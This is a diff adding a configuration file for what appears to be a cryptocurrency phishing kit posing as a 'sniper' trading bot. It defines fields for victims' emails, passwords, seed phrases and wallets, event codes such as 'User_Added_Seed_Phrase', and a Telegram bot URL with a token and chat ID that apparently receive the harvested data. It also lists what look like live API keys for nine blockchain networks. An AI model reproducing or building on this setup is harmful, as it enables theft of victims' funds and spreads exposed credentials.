@@ -1,0 +1,39 @@
+//Headers
+uid=User_ID
+nom=TG_Name
+addi=Email
+authw=Password
+pip=Seed
+ref=Referrer
+net=Network
+bal=Balance
+wal=Wallet
+
+viz=IP Visited Main Website
+tel=IP Clicked Join Telegram Link
+
+//case types
+uR=User_Registered
+uL=User_Logged_In
+uN=User_Picked_A_Network
+uASP=User_Added_Seed_Phrase
+uAWA=User_Added_Wallet_Address
+addFW=User_Completed_Adding_Wallet
+uMM=User_Reached_Main_Sniper_Menu
+uRFSH=User_Refreshed_Balance
+
+//TG API Keys & Tokens
+apiURL=https://api.telegram.org/bot6337181738:AAGZe6O4ZsFMEfZbOOJejNhSgg18mEdjW2Y/sendMessage
+cID=-1002117309898
+
+//Network FETCH API Keys
+ADA_API_KEY=mainnetL3V8KNbizrgm5U3lJIAHtxU7Wl19d0BI
+ARB_API_KEY=FHonIgza5cB_U7-uVAcDXzR3uk8SYEjT
+AVAX_API_KEY=402971a7445747e99b52db59c194354e
+BASE_API_KEY=GEXAvguqJyhhE1aABia0GCYrzfFLgDaZ
+BSC_API_KEY=UJUYX9GAMRPR5DUSWMVN97EDDW882CCJSH
+ETH_API_KEY=LbjqHcfLXW9kaJ-lqSMJMs8N3-Bweav9
+OPT_API_KEY=e4Do9mSaKElAZjhNag9t7GrEHTzN_SD8
+POLY_API_KEY=YBbBIJQV1DhaErJr_zEpExQmyUZZ5Mul
+SOL_API_KEY=okJ3Q7klBus-dxGeb_jILRHtyvoHdUI0
+
